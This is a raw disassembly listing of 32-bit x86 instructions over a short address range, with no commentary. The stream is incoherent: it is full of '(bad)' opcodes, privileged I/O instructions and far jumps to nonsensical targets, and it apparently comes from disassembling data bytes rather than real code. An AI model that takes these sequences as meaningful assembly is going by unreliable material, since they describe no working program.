  408888:	lea    esi,[eax+0x36]
  40888b:	ins    BYTE PTR es:[edi],dx
  40888c:	pop    ebp
  40888d:	mov    ecx,0xc85e9987
  408892:	pop    eax
  408893:	dec    edx
  408894:	mov    bl,0xc7
  408896:	jmp    0x8cf9:0x3eb07c4a
  40889d:	and    eax,DWORD PTR [ebp+0x64743c58]
  4088a3:	add    al,0x69
  4088a5:	fwait
  4088a6:	(bad)  
  4088a7:	jmp    0x40882e
  4088a9:	pmulhw mm7,mm3
  4088ac:	pop    ebp
  4088ad:	pop    ecx
  4088ae:	lahf   
  4088af:	add    al,0x9f
  4088b1:	dec    esi
  4088b2:	ins    DWORD PTR es:[edi],dx
  4088b3:	mov    ebp,0xe24ea7ab
  4088b8:	inc    ecx
  4088b9:	ja     0x4088af
  4088bb:	and    dl,ch
  4088bd:	cwde   
  4088be:	aas    
  4088bf:	repnz xchg esp,eax
  4088c1:	out    dx,al
  4088c2:	jecxz  0x408865
  4088c4:	test   eax,0x68963fd9
  4088c9:	out    0xbb,eax
  4088cb:	inc    esp
  4088cc:	xlat   BYTE PTR ds:[ebx]
  4088cd:	ds inc edx
  4088cf:	retf   
  4088d0:	mov    al,ds:0xfb525bdb
  4088d5:	jp     0x408938
  4088d7:	xor    edi,DWORD PTR es:[ebx+0x52]
  4088db:	repnz push ebp
  4088dd:	mov    ch,BYTE PTR [ecx+edx*8-0x53a7b883]
  4088e4:	ds add eax,edi
  4088e7:	or     eax,0x84194d38
  4088ec:	adc    al,0xd4
  4088ee:	cli    
  4088ef:	or     DWORD PTR [edi-0x39d19802],edx
  4088f5:	add    ch,al
  4088f7:	push   edx
  4088f8:	pop    esp
  4088f9:	shl    BYTE PTR [esi+0x3b8a68ba],cl
  4088ff:	dec    DWORD PTR [eax+0x48]
  408902:	inc    esp
  408903:	ror    DWORD PTR [ecx+0x37],1
  408906:	out    dx,eax
  408907:	sbb    eax,0xad4a4f1c
  40890c:	inc    ebx
  40890d:	or     eax,0x84cbb743
  408912:	mov    WORD PTR [edx+0xc58d651],es
  408918:	clc    
  408919:	mov    BYTE PTR [ebx+0x54aaa184],0xed
  408920:	lds    esi,FWORD PTR [edx-0x4b2e80ec]
  408926:	push   0xffffff80
  408928:	mov    DWORD PTR [ebx+0x62],ecx
  40892b:	call   0x60b00c6e
  408930:	fmulp  st(2),st
  408932:	fldenv [esp+ebx*2-0x3d1254e4]
  408939:	(bad)  
  40893a:	aad    0x61
  40893c:	dec    ebx
  40893d:	and    al,0xb4
  40893f:	mov    ecx,0xea43b5ea
  408944:	or     ebp,DWORD PTR [esi+0x5ef04626]
  40894a:	xchg   BYTE PTR [ecx+ebx*2+0x3f0cd729],ch
  408951:	ja     0x4089a2
  408953:	cmp    dh,BYTE PTR [edx]
  408955:	retf   
  408956:	jge    0x4089bf
  408958:	int    0xd8
  40895a:	and    BYTE PTR [edi+0x41],dh
  40895d:	push   ecx
  40895e:	or     cl,BYTE PTR [esi+0x7]
  408961:	and    ah,0x91
  408964:	jecxz  0x4089a3
  408966:	(bad)  
  408967:	xchg   esp,eax
  408968:	xchg   esi,eax
  408969:	das    
  40896a:	or     DWORD PTR cs:[ebx-0x407cc9ed],esi
  408971:	and    dl,BYTE PTR [ecx+0x3ae841cf]
  408977:	add    dl,0xed
  40897a:	xchg   bh,bl
  40897c:	inc    esp
  40897d:	int3   
  40897e:	pop    ds
  40897f:	je     0x408943
  408981:	pop    eax
  408982:	pushf  
  408983:	add    esp,DWORD PTR [ebx-0x71]
  408986:	mov    eax,DWORD PTR [eax]
  408988:	dec    ebp
  408989:	pop    edx
  40898a:	(bad)  
  40898b:	cld    
  40898c:	mov    dh,0xa2
  40898e:	fst    QWORD PTR [edx]
  408990:	inc    eax
  408991:	add    edi,DWORD PTR [ecx]
  408993:	or     al,BYTE PTR [ebx-0x7]
  408996:	daa    
  408997:	dec    esi
  408998:	das    
  408999:	push   ebx
  40899a:	mov    eax,0x3854e150
  40899f:	mov    al,0xa7
  4089a1:	inc    eax
  4089a2:	push   ds
  4089a3:	aad    0x8c
  4089a5:	mov    esp,0x79e2ce64
  4089aa:	jnp    0x408945
  4089ac:	shl    BYTE PTR [eax-0x78b1d17c],0x29
  4089b3:	cdq    
  4089b4:	adc    bl,BYTE PTR [edi+0xb6cab22]
  4089ba:	sub    eax,0xce74548a
  4089bf:	pop    ebp
  4089c0:	push   edi
  4089c1:	call   0xdbe9d584
  4089c6:	in     al,0xb9
  4089c8:	mov    ah,0x10
  4089ca:	js     0x40897e
  4089cc:	xchg   ecx,eax
  4089cd:	mov    bh,0xd5
  4089cf:	lock xchg ebx,eax
  4089d1:	loope  0x4089c1
  4089d3:	dec    esp
  4089d4:	ss hlt 
  4089d6:	mov    ebx,eax
  4089d8:	lods   eax,DWORD PTR ds:[esi]
  4089d9:	sub    eax,0x2f3c4dbf
  4089de:	sbb    eax,0xb054e6f0
  4089e3:	xchg   edi,eax
  4089e4:	cmp    al,0x85
  4089e6:	jge    0x408a5b
  4089e8:	(bad)  
  4089e9:	add    BYTE PTR [edi+0x6cf37762],bl
  4089ef:	mov    bl,BYTE PTR [edi]
  4089f1:	(bad)  
  4089f2:	lods   al,BYTE PTR ds:[esi]
  4089f3:	sti    
  4089f4:	sbb    dh,BYTE PTR [ebp-0x4d50e443]
  4089fa:	and    cl,cl
  4089fc:	sub    edx,ebp
  4089fe:	(bad)  
  4089ff:	loop   0x408997
  408a01:	sub    dh,BYTE PTR [eax+0x79]
  408a04:	adc    al,0xd4
  408a06:	xor    DWORD PTR [ebp+0x63],ebx
  408a09:	cmp    edi,DWORD PTR [ebp-0x52c9fa96]
  408a0f:	nop
  408a10:	das    
  408a11:	lahf   
  408a12:	outs   dx,DWORD PTR ds:[esi]
  408a13:	xor    ch,BYTE PTR [ebx-0x5]
  408a16:	mov    eax,0xe9cee974
  408a1b:	add    DWORD PTR [edx-0x3c6e723a],ecx
  408a21:	pop    ds
  408a22:	adc    BYTE PTR [ecx],ch
  408a24:	fnstenv [ebx]
  408a26:	mov    edx,0x5bc8d0c9
  408a2b:	sbb    al,0x96
  408a2d:	push   edx
  408a2e:	jle    0x4089d4
  408a30:	outs   dx,BYTE PTR ds:[esi]
  408a31:	dec    ebp
  408a32:	sar    DWORD PTR [eax-0x6f],cl
  408a35:	retf   0xbf0c
  408a38:	fild   WORD PTR [ecx-0x27cf1f2a]
  408a3e:	or     al,0x3b
  408a40:	outs   dx,DWORD PTR ds:[esi]
  408a41:	push   0xf34a90b7
  408a46:	mov    ch,0xb4
  408a48:	(bad)  
  408a49:	jbe    0x408a9c
  408a4b:	xchg   esp,eax
  408a4c:	icebp  
  408a4d:	sbb    cl,BYTE PTR [eax-0x7f]
  408a50:	mov    esi,0xcd88958d
  408a55:	and    DWORD PTR [eax-0x4c0140fd],esp
  408a5b:	int3   
  408a5c:	cmc    
  408a5d:	sbb    BYTE PTR [ecx],al
  408a5f:	test   BYTE PTR [ebx-0x479ed949],0x6a
  408a66:	cmp    DWORD PTR [esi+ecx*2],esi
  408a69:	cdq    
  408a6a:	jg     0x408aaa
  408a6c:	xchg   ebp,eax
  408a6d:	ss dec eax
  408a6f:	and    DWORD PTR [edi+0x69caf870],ebp
  408a75:	cs leave 
  408a77:	pop    esi
  408a78:	inc    ecx
  408a79:	xlat   BYTE PTR ds:[ebx]
  408a7a:	(bad)  
  408a7b:	mov    dl,0xa5
  408a7d:	(bad)  
  408a7e:	in     al,dx
  408a7f:	cli    
  408a80:	repnz fcomp QWORD PTR cs:[ecx+0x2cd91b1a]
  408a88:	in     eax,dx
  408a89:	add    DWORD PTR [ebp+0x597d25d0],0xc2ab3ac8
  408a93:	mov    cl,0x1d
  408a95:	dec    ebx
  408a96:	mov    ecx,0xb6829f72
  408a9b:	sbb    ebx,0xec2b446e
  408aa1:	call   0xd3c2:0x2f6c8573
  408aa8:	mov    edi,DWORD PTR [ebx]
  408aaa:	and    BYTE PTR ds:0xd913f893,0xd4
  408ab1:	and    edi,esp
  408ab3:	jno    0x408ad1
  408ab5:	xlat   BYTE PTR ds:[ebx]
  408ab6:	in     al,0xbb
  408ab8:	jmp    0x7d06:0x64f25c63
  408abf:	sub    al,0x41
  408ac1:	push   0x42
  408ac3:	fbld   TBYTE PTR [ecx+0x15]
  408ac6:	cmp    DWORD PTR [esi-0xf],0x8dbe7a22
  408acd:	xchg   edx,eax
  408ace:	outs   dx,BYTE PTR cs:[esi]
  408ad0:	or     BYTE PTR [eax+edx*2-0x28],ch
  408ad4:	(bad)  
  408ad6:	adc    eax,0x90921f60
  408adb:	js     0x408a7d
  408add:	mov    dl,0xda
  408adf:	mov    ch,al
  408ae1:	pusha  
  408ae2:	les    ebx,FWORD PTR [edi-0x28c80b63]
  408ae8:	lods   al,BYTE PTR ds:[esi]
  408ae9:	cwde   
  408aea:	mov    dh,0xda
  408aec:	xchg   esp,eax
  408aed:	sub    ah,BYTE PTR [edi-0x462c9240]
  408af3:	xor    DWORD PTR [esi],ebx
  408af5:	outs   dx,DWORD PTR ds:[esi]
  408af6:	popa   
  408af7:	imul   ebx,DWORD PTR [ecx+eiz*4-0x102c4ec7],0xffffff89
  408aff:	rcr    BYTE PTR [esi],1
  408b01:	mov    DWORD PTR [edi-0x23fd50d3],eax
  408b07:	test   eax,0xbc408aa9
  408b0c:	cmp    dh,BYTE PTR [ecx]
  408b0e:	test   DWORD PTR [ecx+ebx*4-0x5c],edx
  408b12:	js     0x408b81
  408b14:	jo     0x408b6e
  408b16:	push   0x4b778df7
  408b1b:	mov    eax,ds:0xb0d3a1aa
  408b20:	cmp    DWORD PTR [esi-0x392ba7f9],edx
  408b26:	adc    BYTE PTR [esi],al
  408b28:	sub    al,0xbf
  408b2a:	inc    esi
  408b2b:	push   ss
  408b2c:	pushf  
  408b2d:	mov    DWORD PTR [eax+ebx*8],esp
  408b30:	cmp    esp,edi
  408b32:	jne    0x408ba0
  408b34:	add    edi,DWORD PTR [edi]
  408b36:	(bad)  
  408b37:	xchg   ebx,eax
  408b38:	inc    BYTE PTR [edi]
  408b3a:	jmp    0x408bb3
  408b3c:	mov    edi,0xf94a5a54
  408b41:	outs   dx,BYTE PTR ds:[esi]
  408b42:	icebp  
  408b43:	pop    DWORD PTR ss:[ebp+0x2f0ddaba]
  408b4a:	in     al,0xb1
  408b4c:	sub    bh,BYTE PTR ds:0x721994d0
  408b52:	stc    
  408b53:	std    
  408b54:	inc    esi
  408b55:	mov    dh,0x7e
  408b57:	enter  0x3ed2,0x51
  408b5b:	arpl   WORD PTR [edi],di
  408b5d:	inc    eax
  408b5e:	sub    BYTE PTR [edx+0x16071865],dl
  408b64:	fstp   TBYTE PTR [eax-0x35]
  408b67:	int    0xfc
  408b69:	sar    dl,1
  408b6b:	xchg   ebx,eax
  408b6c:	loop   0x408bcd
  408b6e:	sub    ebp,esp
  408b70:	xchg   ebx,eax
  408b71:	push   cs
  408b72:	dec    esi
  408b73:	clc    
  408b74:	aam    0x93
  408b76:	push   ds
  408b77:	fidivr WORD PTR ss:0x6f097546
  408b7e:	mov    edx,0x5b4de31c
  408b83:	mov    bl,0xd9
  408b85:	stos   DWORD PTR es:[edi],eax
  408b86:	cmp    bh,BYTE PTR [ebp-0x53]
  408b89:	stos   BYTE PTR es:[edi],al
  408b8a:	fst    st(1)
  408b8c:	scas   eax,DWORD PTR es:[edi]
  408b8d:	gs in  al,dx
  408b8f:	mov    esi,0xf73b380f
  408b94:	mov    ebx,0xceaec899
  408b99:	ror    DWORD PTR [esp+edx*8],0xb4
  408b9d:	fisub  DWORD PTR [ecx+esi*4-0x4dc5f7d2]
  408ba4:	daa    
  408ba5:	pop    esp
  408ba6:	scas   al,BYTE PTR es:[edi]
  408ba7:	push   ss
  408ba8:	xchg   BYTE PTR [edi-0x47],bl
  408bab:	iret   
  408bac:	aas    
  408bad:	pusha  
  408bae:	call   0xe187:0xae74d894
  408bb5:	into   
  408bb6:	cmp    BYTE PTR [ebx-0x33],al
  408bb9:	shl    eax,0xb4
  408bbc:	push   edx
  408bbd:	or     DWORD PTR [eax+0x2d],ebx
  408bc0:	sbb    BYTE PTR [ebx-0x546b77dc],dl
  408bc6:	out    dx,eax
  408bc7:	fisttp QWORD PTR [edi]
  408bc9:	xchg   DWORD PTR [esi+eax*2+0x70],ecx
  408bcd:	mov    esp,0xa095474c
  408bd2:	mov    ebp,0x8b85869a
  408bd7:	pop    edx
  408bd8:	jg     0x408b6c
  408bda:	mov    ds:0xf3dad64c,al
  408bdf:	out    dx,eax
  408be0:	fiadd  DWORD PTR [edx+eiz*8+0x41e84c9]
  408be7:	mov    edx,0x999c5d2
  408bec:	pop    ss
  408bed:	xor    eax,0xe0ccfcbe
  408bf2:	out    dx,eax
  408bf3:	test   eax,0xdecdafa8
  408bf8:	stos   BYTE PTR es:[edi],al
  408bf9:	cmp    al,0xf4
  408bfb:	call   FWORD PTR [ebx]
  408bfd:	adc    bh,0x2b
  408c00:	(bad)  
  408c01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c02:	(bad)  
  408c03:	out    dx,eax
  408c04:	cmp    DWORD PTR [edi],edx
  408c06:	scas   eax,DWORD PTR es:[edi]
  408c07:	dec    esp
  408c08:	fwait
  408c09:	lods   al,BYTE PTR ds:[esi]
  408c0a:	push   ss
  408c0b:	in     eax,0xbc
  408c0d:	fst    DWORD PTR [edx]
  408c0f:	jb     0x408c70
  408c11:	hlt    
  408c12:	rsm    
  408c14:	mov    ch,0xd1
  408c16:	adc    BYTE PTR [ebp-0x3819723a],ah
  408c1c:	ja     0x408beb
  408c1e:	cmp    eax,0x374d7085
  408c23:	shl    eax,cl
  408c25:	inc    esp
  408c26:	dec    ebx
  408c27:	(bad)  
  408c28:	(bad)  
  408c2a:	ins    DWORD PTR es:[edi],dx
  408c2b:	js     0x408c58
  408c2d:	nop
  408c2e:	mul    BYTE PTR [ecx-0x43]
  408c31:	fsub   DWORD PTR [esi+0x4c5004c8]
  408c37:	cmp    ecx,edi
  408c39:	mov    dl,0x71
  408c3b:	push   esp
  408c3c:	inc    edx
  408c3d:	add    dh,BYTE PTR [ecx-0x22]
  408c40:	jns    0x408caa
  408c42:	xchg   ebx,eax
  408c43:	cmp    ch,BYTE PTR ds:0xe25fb097
  408c49:	jecxz  0x408c28
  408c4b:	leave  
  408c4c:	cmp    eax,DWORD PTR [ebp-0x34]
  408c4f:	pop    esp
  408c50:	inc    esi
  408c51:	jbe    0x408bf6
  408c53:	and    ch,BYTE PTR [ebx+0x7e84569c]
  408c59:	cli    
  408c5a:	ss inc ebx
  408c5c:	je     0x408bf5
  408c5e:	arpl   WORD PTR [esi-0x56],sp
  408c61:	jo     0x408c5e
  408c63:	bnd jmp 0x408c0c
  408c66:	loopne 0x408c50
  408c68:	push   esp
  408c69:	push   ecx
  408c6a:	inc    edi
  408c6b:	jno    0x408c75
  408c6d:	cmp    al,0xce
  408c6f:	adc    eax,DWORD PTR [edx+ebx*1]
  408c72:	adc    BYTE PTR [ebx-0x20],bl
  408c75:	fisubr DWORD PTR [ebx-0x3b866df5]
  408c7b:	cmc    
  408c7c:	jle    0x408c7a
  408c7e:	mov    ch,0x9f
  408c80:	call   0x7fa6:0x893f25c0
  408c87:	sub    dh,BYTE PTR ds:0xafc3b834
  408c8d:	and    cl,ah
  408c8f:	dec    eax
  408c90:	dec    edx
  408c91:	sub    DWORD PTR [edi-0x19],0x98781d5
  408c98:	fwait
  408c99:	jns    0x408c2d
  408c9b:	jno    0x408c26
  408c9d:	stc    
  408c9e:	mov    ebx,0xd51ec18e
  408ca3:	sti    
  408ca4:	nop
  408ca5:	mov    es,WORD PTR [esp+edi*8-0x4245dc12]
  408cac:	pop    esi
  408cad:	ins    BYTE PTR es:[edi],dx
  408cae:	dec    ebp
  408caf:	gs pop ebp
  408cb1:	push   edi
  408cb2:	into   
  408cb3:	ss push 0x368d5b43
  408cb9:	add    eax,DWORD PTR [esp+ebp*1]
  408cbc:	and    ebp,DWORD PTR [ebp+edx*1+0x5784de8a]
  408cc3:	lea    eax,[ecx+0x760b23ea]
  408cc9:	jmp    0x6c95f95e
  408cce:	cmp    ebx,esp
  408cd0:	rcr    DWORD PTR [eax-0x5f],cl
  408cd3:	and    al,0x87
  408cd5:	pusha  
  408cd6:	mov    cl,0xd1
  408cd8:	jg     0x408c94
  408cda:	lds    eax,FWORD PTR [edi]
  408cdc:	adc    ch,BYTE PTR [eax-0x1d]
  408cdf:	or     cl,bh
  408ce1:	ds jp  0x408c81
  408ce4:	imul   esi,DWORD PTR [ebx],0xffffff87
  408ce7:	(bad)  
  408ce8:	jg     0x408c93
  408cea:	shr    bh,0x8d
  408ced:	inc    edx
  408cee:	pop    esi
  408cef:	fdivr  st,st(0)
  408cf1:	jmp    0x12c3:0xd2f801b7
  408cf8:	and    eax,0xfda458ee
  408cfd:	popa   
  408cfe:	test   DWORD PTR [edx+0x1e],esp
  408d01:	sti    
  408d02:	in     eax,dx
  408d03:	std    
  408d04:	jne    0x408c9c
  408d06:	lock pusha 
  408d08:	stc    
  408d09:	add    BYTE PTR [eax-0x2b6f261e],0xbc
  408d10:	xchg   esp,eax
  408d11:	push   ebx
  408d12:	jae    0x408d21
  408d14:	dec    ebp
  408d15:	es repz test DWORD PTR ds:[edi+0x1e695d89],esi
  408d1e:	cld    
  408d1f:	arpl   WORD PTR [edx+0x1f],bp
  408d22:	jl     0x408cc5
  408d24:	dec    ebp
  408d25:	add    dh,BYTE PTR [ebp-0x59]
  408d28:	add    DWORD PTR [eax+edi*2-0x3d739914],eax
  408d2f:	adc    dl,dl
  408d31:	push   ds
  408d32:	jne    0x408d8c
  408d34:	or     eax,0x26b015f9
  408d39:	out    0x2,eax
  408d3b:	pop    esi
  408d3c:	aam    0x6d
  408d3e:	ins    BYTE PTR es:[edi],dx
  408d3f:	adc    eax,0xfc4355ce
  408d44:	dec    sp
  408d46:	pusha  
  408d47:	adc    DWORD PTR [ecx+0x2fbb76e9],ecx
  408d4d:	push   es
  408d4e:	push   eax
  408d4f:	pusha  
  408d50:	les    ebx,FWORD PTR [ebx]
  408d52:	hlt    
  408d53:	or     BYTE PTR [eax+eax*1+0x5b68bfcf],ah
  408d5a:	cmc    
  408d5b:	mov    BYTE PTR [edx+0x36],0x9c
  408d5f:	retf   0xd11
  408d62:	xchg   ebp,eax
  408d63:	psllw  mm1,QWORD PTR [esp+eax*8]
  408d67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d68:	sbb    DWORD PTR [edx+0x65e9b80],ecx
  408d6e:	add    DWORD PTR [esp+ebp*4+0x9],edx
  408d72:	stc    
  408d73:	sub    BYTE PTR [eax-0x4b],ch
  408d76:	cmc    
  408d77:	cdq    
  408d78:	stos   DWORD PTR es:[edi],eax
  408d79:	mov    ch,0x80
  408d7b:	xor    DWORD PTR [ecx-0x72],edi
  408d7e:	mov    bh,0xd7
  408d80:	and    ebp,esi
  408d82:	sahf   
  408d83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d84:	(bad)  
  408d85:	mov    edi,edx
  408d87:	and    esi,esi
  408d89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d8a:	lea    eax,[eax+0x26]
  408d8d:	pop    esi
  408d8e:	das    
  408d8f:	in     eax,dx
  408d90:	jnp    0x408d2e
  408d92:	jbe    0x408d1d
  408d94:	cld    
  408d95:	and    DWORD PTR ds:0xfd21a3db,edx
  408d9b:	add    cl,BYTE PTR [eax+0x70cffdc9]
  408da1:	jo     0x408d83
  408da3:	xchg   edx,eax
  408da4:	sbb    esp,DWORD PTR [ebp-0x5e]
  408da7:	lahf   
  408da8:	mov    ds:0xcfca259e,al
  408dad:	mov    WORD PTR [edi-0x2a6d1f8],ss
  408db3:	lea    ebp,[eax+0x1d35cb1d]
  408db9:	xor    ah,bl
  408dbb:	dec    ebx
  408dbc:	(bad)  
  408dbd:	fst    QWORD PTR [eax]
  408dbf:	test   BYTE PTR [edx-0x7e],0x16
  408dc3:	in     eax,dx
  408dc4:	nop
  408dc5:	test   BYTE PTR ds:0x840fdbff,bl
  408dcb:	xchg   DWORD PTR [eax],ebx
  408dcd:	ret    
  408dce:	outs   dx,DWORD PTR ds:[esi]
  408dcf:	push   esp
  408dd0:	das    
  408dd1:	addr16 int 0xb1
  408dd4:	enter  0x58d,0xf3
  408dd8:	ss out 0x68,al
  408ddb:	mov    bh,BYTE PTR [edi+edi*4-0x6cfe2f9a]
  408de2:	je     0x408de8
  408de4:	xor    cl,BYTE PTR [esi]
  408de6:	cmp    eax,0xb68464ab
  408deb:	ror    BYTE PTR [edi+0x4e],cl
  408dee:	jo     0x408d95
  408df0:	sbb    DWORD PTR [ebx],0x2c
  408df3:	jp     0x408db8
  408df5:	mov    eax,ds:0x29d26035
  408dfa:	jnp    0x408dab
  408dfc:	dec    edi
  408dfd:	jbe    0x408da5
  408dff:	pop    ecx
  408e00:	aaa    
  408e01:	and    DWORD PTR [edi],edx
  408e03:	aam    0x3c
  408e05:	sub    eax,0x7ed3af5e
  408e0a:	(bad)  
  408e0b:	and    eax,0x932ce932
  408e10:	and    ch,bl
  408e12:	cmc    
  408e13:	fisub  WORD PTR [ecx]
  408e15:	cld    
  408e16:	int3   
  408e17:	and    eax,0xc1a629e5
  408e1c:	ret    
  408e1d:	mov    WORD PTR [ecx-0x62368020],ds
  408e23:	icebp  
  408e24:	mov    ebx,0x97d33e99
  408e29:	popf   
  408e2a:	mov    ebx,0xc4b5327a
  408e2f:	mul    edi
  408e31:	icebp  
  408e32:	pop    ss
  408e33:	inc    BYTE PTR [edi+0x31]
  408e36:	mov    esp,DWORD PTR [edi+0x6d0021]
  408e3c:	popa   
  408e3d:	fs mov ch,0x61
  408e40:	and    DWORD PTR [esi],ebx
  408e42:	inc    eax
  408e43:	sbb    edi,DWORD PTR [edi-0x10]
  408e46:	push   esp
  408e47:	cs or  al,0x21
  408e4a:	aas    
  408e4b:	sub    DWORD PTR [edi],ebp
  408e4d:	jbe    0x408e4a
  408e4f:	mov    dh,0xb9
  408e51:	xchg   edx,eax
  408e52:	loope  0x408e43
  408e54:	call   0x4392bdf5
  408e59:	mov    al,ds:0x4a451235
  408e5e:	lods   al,BYTE PTR ds:[esi]
  408e5f:	mov    bl,0x13
  408e61:	adc    BYTE PTR [eax+ebx*4-0x24986725],al
  408e68:	test   BYTE PTR [esp+edi*4-0x2],0x47
  408e6d:	sbb    al,BYTE PTR [ecx+0x45]
  408e70:	cdq    
  408e71:	rcl    DWORD PTR [edx+edx*1-0x68565a3a],0xcd
  408e79:	jae    0x408e64
  408e7b:	ret    0xca07
  408e7e:	test   DWORD PTR [edi-0x4a],eax
  408e81:	cmp    al,0xe3
  408e83:	xor    dh,BYTE PTR [ebp-0x54fc2748]
  408e89:	repnz adc DWORD PTR [ebx+0x49],edi
  408e8d:	or     BYTE PTR [edi+0x1],ah
  408e90:	bound  esi,QWORD PTR [eax]
  408e92:	xchg   BYTE PTR [eax],al
  408e94:	mov    eax,ds:0x82a2bd65
  408e99:	xor    ch,bl
  408e9b:	pop    ss
  408e9c:	ror    bh,1
  408e9e:	lock les eax,FWORD PTR [edi+0x4e]
  408ea2:	jecxz  0x408ecb
  408ea4:	inc    eax
  408ea5:	outs   dx,BYTE PTR ds:[esi]
  408ea6:	hlt    
  408ea7:	ins    DWORD PTR es:[edi],dx
  408ea8:	sub    ecx,ebx
  408eaa:	bound  esp,QWORD PTR [esi]
  408eac:	cmp    dl,BYTE PTR [ebx-0x72]
  408eaf:	shl    ch,1
  408eb1:	or     edx,DWORD PTR [eax]
  408eb3:	stos   DWORD PTR es:[edi],eax
  408eb4:	or     eax,0xbb1a6fdc
  408eb9:	(bad)  
  408eba:	sti    
  408ebb:	mov    bl,ah
  408ebd:	jbe    0x408eb9
  408ebf:	jecxz  0x408edb
  408ec1:	xor    eax,0x779fefe5
  408ec6:	in     eax,dx
  408ec7:	scas   al,BYTE PTR es:[edi]
  408ec8:	or     eax,DWORD PTR [eax]
  408eca:	xor    ecx,DWORD PTR [ecx+eiz*1+0x25]
  408ece:	mov    ds:0x5f85eab4,al
  408ed3:	(bad)  
  408ed4:	jle    0x408e67
  408ed6:	stos   BYTE PTR es:[edi],al
  408ed7:	int3   
  408ed8:	repz test esi,ebp
  408edb:	cmp    BYTE PTR [ebx-0x47],bh
  408ede:	icebp  
  408edf:	mov    dh,0x43
  408ee1:	pop    edi
  408ee2:	bound  ebp,QWORD PTR [ebx]
  408ee4:	mov    edi,?
  408ee6:	mov    eax,edi
  408ee8:	xlat   BYTE PTR ds:[ebx]
  408ee9:	inc    esp
  408eea:	mov    ds:0xaf8a3e29,al
  408eef:	std    
  408ef0:	jmp    0x9548c4ea
  408ef5:	mov    ebp,0x899b3154
  408efa:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  408efc:	aad    0x60
  408efe:	mov    dl,0x9d
  408f00:	mov    edx,0x4601f468
  408f05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f06:	cwde   
  408f07:	dec    BYTE PTR [esi*2-0x15e37b8a]
  408f0e:	and    eax,0xfb17fe09
  408f13:	sti    
  408f14:	in     al,dx
  408f15:	sub    ax,0xa35d
  408f19:	ficom  DWORD PTR [edi]
  408f1b:	ins    DWORD PTR es:[edi],dx
  408f1c:	xor    al,0x88
  408f1e:	stos   DWORD PTR es:[edi],eax
  408f1f:	frstor [edx]
  408f21:	stos   DWORD PTR es:[edi],eax
  408f22:	(bad)  
  408f23:	jle    0x408f40
  408f25:	pushf  
  408f26:	fldenv ds:0x9cf2627d
  408f2c:	aaa    
  408f2d:	or     DWORD PTR [esi-0x5739819],0x9c840a30
  408f37:	dec    BYTE PTR [eax+esi*1-0x7e]
  408f3b:	(bad)  
  408f3c:	aad    0xf0
  408f3e:	sub    BYTE PTR [ebp+0x4c166f2],bh
  408f44:	ins    BYTE PTR es:[edi],dx
  408f45:	jns    0x408fa1
  408f47:	jb     0x408f56
  408f49:	push   esp
  408f4a:	xchg   DWORD PTR ds:0x1f0bd7c3,ebx
  408f50:	dec    edi
  408f51:	rcl    DWORD PTR [ebp-0x3c],cl
  408f54:	scas   al,BYTE PTR es:[edi]
  408f55:	mov    ecx,0x52294e8c
  408f5a:	scas   eax,DWORD PTR es:[edi]
  408f5b:	ins    DWORD PTR es:[edi],dx
  408f5c:	xchg   edx,eax
  408f5d:	test   BYTE PTR [esp+ecx*2],0x2c
  408f61:	repz mov esi,0x8de40838
  408f67:	inc    esp
  408f68:	sub    cl,dh
  408f6a:	or     dl,BYTE PTR [edi]
  408f6c:	add    DWORD PTR [edx-0x44],ebp
  408f6f:	retf   0x5411
  408f72:	out    0x15,al
  408f74:	mov    dh,0xcb
  408f76:	fadd   DWORD PTR [esi+0x3d]
  408f79:	adc    al,0xf1
  408f7b:	fsubp  st(3),st
  408f7d:	mov    DWORD PTR [ebx+edi*8+0x635a23ff],esi
  408f84:	xchg   ebp,eax
  408f85:	cmp    eax,DWORD PTR [edx+0x3c]
  408f88:	and    BYTE PTR [ecx-0x7d351d1e],bl
  408f8e:	stc    
  408f8f:	scas   eax,DWORD PTR es:[edi]
  408f90:	jg     0x408fe7
  408f92:	or     BYTE PTR [ecx+0x10],bl
  408f95:	inc    edi
  408f96:	test   BYTE PTR [ebx+0x308f056],bl
  408f9c:	inc    bl
  408f9e:	mov    ds:0xc2fa82c4,eax
  408fa3:	jmp    0x9b63311a
  408fa8:	and    ebp,DWORD PTR [eax]
  408faa:	popa   
  408fab:	push   es
  408fac:	cli    
  408fad:	mov    ah,0x60
  408faf:	inc    ebp
  408fb0:	(bad)  
  408fb1:	cmp    al,0xc8
  408fb3:	and    BYTE PTR [esp+ebp*4+0x69],bh
  408fb7:	cmc    
  408fb8:	push   esi
  408fb9:	mov    dl,BYTE PTR [ecx+0x26029a53]
  408fbf:	xchg   bl,dl
  408fc1:	fcmovnbe st,st(6)
  408fc3:	arpl   WORD PTR [ecx],ax
  408fc5:	jne    0x408fcf
  408fc7:	mov    ebx,0x30383109
  408fcc:	push   eax
  408fcd:	es (bad) 
  408fcf:	jge    0x408fb8
  408fd1:	and    al,0x5
  408fd3:	jmp    DWORD PTR [ebx+0x26]
  408fd6:	mov    ecx,0x90685a36
  408fdb:	(bad)  
  408fdd:	cmc    
  408fde:	adc    eax,0x75d66987
  408fe3:	and    esi,DWORD PTR [edx]
  408fe5:	sub    ecx,esp
  408fe7:	xchg   ecx,eax
  408fe8:	pop    eax
  408fe9:	int    0x42
  408feb:	repnz fisub WORD PTR [edi+0x18]
  408fef:	outs   dx,DWORD PTR ds:[esi]
  408ff0:	inc    esi
  408ff1:	xchg   ebx,eax
  408ff2:	sub    eax,0xae21cffb
  408ff7:	mov    dh,0xbf
  408ff9:	dec    esp
  408ffa:	(bad)  
  408ffb:	ds pop ds
  408ffd:	sbb    DWORD PTR [eax],esi
  408fff:	push   edx
  409000:	ds std 
  409002:	sahf   
  409003:	addr16 jbe 0x408f94
  409006:	lods   al,BYTE PTR ds:[esi]
  409007:	test   al,0x9d
  409009:	sub    edi,ecx
  40900b:	es call 0x6e4c3530
  409011:	mov    ah,0x2e
  409013:	mov    cl,BYTE PTR [esi]
  409015:	repnz inc esp
  409017:	inc    esi
  409018:	xor    al,0x4b
  40901a:	xchg   edx,eax
  40901b:	xchg   esi,esp
  40901d:	nop
  40901e:	fsub   DWORD PTR [eax]
  409020:	xor    edi,DWORD PTR [edi+0x578142a5]
  409026:	dec    ebp
  409027:	ffreep st(1)
  409029:	jg     0x408fbd
  40902b:	mov    al,ds:0x79801fb8
  409030:	push   esi
  409031:	popf   
  409032:	ror    BYTE PTR [eax+0x741150c1],1
